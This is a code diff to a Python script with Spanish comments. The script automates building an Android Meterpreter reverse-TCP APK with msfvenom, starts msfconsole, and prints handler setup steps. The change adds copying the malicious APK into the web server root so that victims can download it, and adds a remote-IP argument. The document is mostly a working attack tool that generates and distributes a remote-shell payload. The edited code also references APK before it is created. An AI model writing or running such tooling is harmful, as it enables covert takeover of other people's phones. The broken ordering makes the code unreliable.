@@ -2,6 +2,7 @@ import socket
 import os
 import argparse
 from subprocess import Popen, PIPE, STDOUT
+from shutil import copyfile
 
 class createAPK:
     def get_ip_address(self):
@@ -23,6 +24,7 @@ class createAPK:
         com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp[0]+" R >"+app_name[0]+".apk"
         
         self.launchProcess(com)
+        copyfile(app_name, "/var/www/html/upload.apk")
         
         return ipl
         
@@ -34,16 +36,18 @@ parser.add_argument('app_name', metavar='name', type=str, nargs='+',
                     help='nombre de la app')
 parser.add_argument('lp', metavar='lp', type=str, nargs='+',
                     help='local port')
+parser.add_argument('ipr', metavar='ipr', type=str, nargs='+',
+                    help='remote ip')
 args = parser.parse_args()
 ##//PARSER SHIT---------
-
-APK = createAPK()
-print "Generando APK..."
-ipl = APK.create(args.app_name, args.lp)
+print "lp: " + args.lp[0] + "app_name: " + args.app_name[0] + " ipr: " + args.ipr[0]
 print "Iniciando postgresql..."
 APK.launchProcess("service postgresql start")
 print "Iniciando msfconsole en nueva ventana..."
 APK.launchProcess("gnome-terminal -e 'bash -c \"msfconsole; exec bash\"'")
+APK = createAPK()
+print "Generando APK..."
+ipl = APK.create(args.app_name, args.lp)
 print "--usa esta guia--"
 print "use exploit/multi/handler"
 print "set payload android/meterpreter/reverse_tcp"
@@ -53,3 +57,5 @@ print "exploit"
 
 
 raw_input("Presiona una tecla cuando hayas configurado el handler...")
+
+
